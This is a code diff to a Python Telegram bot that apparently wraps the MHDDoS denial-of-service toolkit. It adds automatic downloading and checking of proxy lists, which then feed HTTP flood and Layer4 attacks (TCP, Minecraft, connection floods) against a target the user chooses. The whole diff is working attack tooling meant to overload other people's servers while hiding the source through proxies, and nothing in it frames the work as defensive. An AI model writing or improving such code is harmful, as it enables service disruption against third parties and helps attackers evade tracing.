@@ -40,11 +40,13 @@ from start import (
     HttpFlood,
     Layer4,
     Methods,
+    ProxyManager,
     ProxyUtiles,
     Tools,
     ToolsConsole,
     con,
 )
+from PyRoxy import ProxyChecker, ProxyType
 
 # Configure logging
 logging.basicConfig(
@@ -125,6 +127,85 @@ class AttackSession:
     threads: List[Thread] = field(default_factory=list)
     is_running: bool = False
     monitor_task: Optional[asyncio.Task] = None
+
+
+def get_proxy_file_path(proxy_type: int) -> Path:
+    """Get the proxy file path based on proxy type."""
+    proxy_type_names = {
+        1: "http",
+        4: "socks4", 
+        5: "socks5",
+    }
+    proxy_name = proxy_type_names.get(proxy_type, "http")
+    return __dir__ / f"files/proxies/{proxy_name}.txt"
+
+
+async def handle_proxy_list(proxy_type: int, threads: int = 100, url: Optional[URL] = None):
+    """
+    Handle proxy list similar to CLI version.
+    Downloads and checks proxies if file doesn't exist.
+    
+    Args:
+        proxy_type: Proxy type (0=All, 1=HTTP, 4=SOCKS4, 5=SOCKS5, 6=Random)
+        threads: Number of threads for proxy checking
+        url: Target URL for proxy validation
+    
+    Returns:
+        Set of proxies or None
+    """
+    from random import choice as randchoice
+    
+    if proxy_type not in {4, 5, 1, 0, 6}:
+        return None
+    
+    # Handle random proxy type
+    if proxy_type == 6:
+        proxy_type = randchoice([4, 5, 1])
+    
+    proxy_li = get_proxy_file_path(proxy_type)
+    
+    if not proxy_li.exists():
+        logger.info("Proxy file doesn't exist, downloading proxies...")
+        proxy_li.parent.mkdir(parents=True, exist_ok=True)
+        
+        try:
+            # Download proxies from config providers
+            proxies = ProxyManager.DownloadFromConfig(con, proxy_type)
+            logger.info(f"Downloaded {len(proxies):,} proxies, checking...")
+            
+            # Check proxies
+            proxies = ProxyChecker.checkAll(
+                proxies, 
+                timeout=5, 
+                threads=threads,
+                url=url.human_repr() if url else "http://httpbin.org/get",
+            )
+            
+            if not proxies:
+                logger.warning("No valid proxies found after checking")
+                return None
+            
+            # Save checked proxies to file
+            with proxy_li.open("w") as wr:
+                for proxy in proxies:
+                    wr.write(str(proxy) + "\n")
+            
+            logger.info(f"Saved {len(proxies):,} valid proxies to file")
+            return proxies
+            
+        except Exception as e:
+            logger.error(f"Failed to download/check proxies: {str(e)}")
+            return None
+    
+    # Read existing proxies from file
+    proxies = ProxyUtiles.readFromFile(proxy_li)
+    if proxies:
+        logger.info(f"Loaded {len(proxies):,} proxies from file")
+    else:
+        logger.warning("Empty proxy file")
+        proxies = None
+    
+    return proxies
 
 
 class MHDDoSBot:
@@ -939,12 +1020,10 @@ Memory: {virtual_memory().percent}%
         if referers_li.exists():
             referers = set(a.strip() for a in referers_li.open("r").readlines() if a.strip())
         
-        # Handle proxies
+        # Handle proxies using PyRoxy (same as CLI)
         proxies = None
         if config.proxy_type >= 0:
-            proxy_li = __dir__ / "files/proxies/http.txt"
-            if proxy_li.exists():
-                proxies = ProxyUtiles.readFromFile(proxy_li)
+            proxies = await handle_proxy_list(config.proxy_type, config.threads, url)
         
         # Start threads
         for thread_id in range(config.threads):
@@ -958,8 +1037,9 @@ Memory: {virtual_memory().percent}%
         session.event.set()
         session.is_running = True
         
+        proxy_info = f"\nProxies: {len(proxies):,}" if proxies else "\nProxies: None"
         await query.edit_message_text(
-            f"Attack started!\n\nTarget: {config.target}\nMethod: {config.method}\nThreads: {config.threads}\nDuration: {config.duration}s",
+            f"Attack started!\n\nTarget: {config.target}\nMethod: {config.method}\nThreads: {config.threads}\nDuration: {config.duration}s{proxy_info}",
             reply_markup=self.get_stop_keyboard()
         )
     
@@ -973,12 +1053,10 @@ Memory: {virtual_memory().percent}%
         except Exception as e:
             raise Exception(f"Cannot resolve hostname: {str(e)}")
         
-        # Handle proxies for supported methods
+        # Handle proxies for supported methods using PyRoxy (same as CLI)
         proxies = None
         if config.method in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"} and config.proxy_type >= 0:
-            proxy_li = __dir__ / "files/proxies/http.txt"
-            if proxy_li.exists():
-                proxies = ProxyUtiles.readFromFile(proxy_li)
+            proxies = await handle_proxy_list(config.proxy_type, config.threads)
         
         # Start threads
         for _ in range(config.threads):
@@ -992,8 +1070,9 @@ Memory: {virtual_memory().percent}%
         session.event.set()
         session.is_running = True
         
+        proxy_info = f"\nProxies: {len(proxies):,}" if proxies else ""
         await query.edit_message_text(
-            f"Attack started!\n\nTarget: {target}:{config.port}\nMethod: {config.method}\nThreads: {config.threads}\nDuration: {config.duration}s",
+            f"Attack started!\n\nTarget: {target}:{config.port}\nMethod: {config.method}\nThreads: {config.threads}\nDuration: {config.duration}s{proxy_info}",
             reply_markup=self.get_stop_keyboard()
         )
     
